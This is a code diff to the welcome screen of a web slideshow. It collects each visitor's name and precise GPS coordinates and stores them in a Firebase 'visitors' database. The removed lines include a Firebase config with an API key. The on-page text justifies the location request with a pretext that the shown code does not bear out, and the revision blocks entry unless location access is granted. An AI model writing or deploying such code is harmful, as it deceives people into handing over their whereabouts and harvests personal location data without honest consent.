@@ -11,65 +11,62 @@ function showWelcomeScreen() {
         <div class="welcome-content">
             <h2>Welcome to the Slideshow</h2>
             <input type="text" id="nameInput" placeholder="Enter your name" />
-            <p>To provide the best experience, we need access to your precise location. This will help us show nearby landmarks.</p>
+            <div class="error-message" id="nameError">Please enter your name</div>
+            <p>We'd like to show your location on the map to enhance your experience.</p>
             <button id="enterBtn">Enter</button>
+            <div class="error-message" id="locationError">Please allow location access</div>
         </div>
     `;
     document.body.appendChild(welcomeDiv);
 
-    // Add Firebase configuration at the top
-    const firebaseConfig = {
-        apiKey: "AIzaSyAYyhwvbR0j05AzO5CKq_YvQ6Sa_2ZqPF0",
-        authDomain: "scenery-burst.firebaseapp.com",
-        databaseURL: "https://scenery-burst-default-rtdb.firebaseio.com",
-        projectId: "scenery-burst",
-        storageBucket: "scenery-burst.firebasestorage.app",
-        messagingSenderId: "676260138190",
-        appId: "1:676260138190:web:0f942d17e9d7d82be5549f"
-    };
-    
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
-    
-    // Modify the enter button click handler in showWelcomeScreen
     const enterBtn = document.getElementById('enterBtn');
+    const nameInput = document.getElementById('nameInput');
+    const nameError = document.getElementById('nameError');
+    const locationError = document.getElementById('locationError');
+
     enterBtn.addEventListener('click', async () => {
-        viewerName = document.getElementById('nameInput').value.trim();
-        if (viewerName) {
-            try {
-                const position = await getPreciseLocation();
-                const { latitude, longitude, accuracy } = position.coords;
-                
-                console.log('Exact Location:', {
-                    latitude: latitude.toFixed(6),
-                    longitude: longitude.toFixed(6),
-                    accuracy: `${accuracy} meters`
-                });
+        // Reset errors
+        nameError.style.display = 'none';
+        locationError.style.display = 'none';
+        nameInput.classList.remove('error');
 
-                // Save data to Firebase
-                const visitorRef = database.ref('visitors').push();
-                visitorRef.set({
-                    name: viewerName,
-                    location: { 
-                        latitude: latitude.toFixed(6),
-                        longitude: longitude.toFixed(6),
-                        accuracy: accuracy
-                    },
-                    timestamp: firebase.database.ServerValue.TIMESTAMP
-                });
+        // Validate name
+        viewerName = nameInput.value.trim();
+        if (!viewerName) {
+            nameError.style.display = 'block';
+            nameInput.classList.add('error');
+            return;
+        }
 
-                document.body.removeChild(welcomeDiv);
-            } catch (error) {
-                console.error('Error getting location:', error);
-                // Handle case where user denies permission
-                const visitorRef = database.ref('visitors').push();
-                visitorRef.set({
-                    name: viewerName,
-                    timestamp: firebase.database.ServerValue.TIMESTAMP
-                });
-                document.body.removeChild(welcomeDiv);
+        // Show loading state
+        enterBtn.classList.add('loading');
+        enterBtn.textContent = 'Loading...';
+        enterBtn.disabled = true;
+
+        try {
+            const position = await getPreciseLocation();
+            const { latitude, longitude } = position.coords;
+            
+            // Save data to Firebase
+            const visitorRef = database.ref('visitors').push();
+            await visitorRef.set({
+                name: viewerName,
+                location: { latitude, longitude },
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+
+            // Remove welcome screen
+            document.body.removeChild(welcomeDiv);
+        } catch (error) {
+            console.error('Error:', error);
+            // Show appropriate error
+            if (error.code === error.PERMISSION_DENIED) {
+                locationError.style.display = 'block';
             }
+            // Reset button
+            enterBtn.classList.remove('loading');
+            enterBtn.textContent = 'Enter';
+            enterBtn.disabled = false;
         }
     });
 }
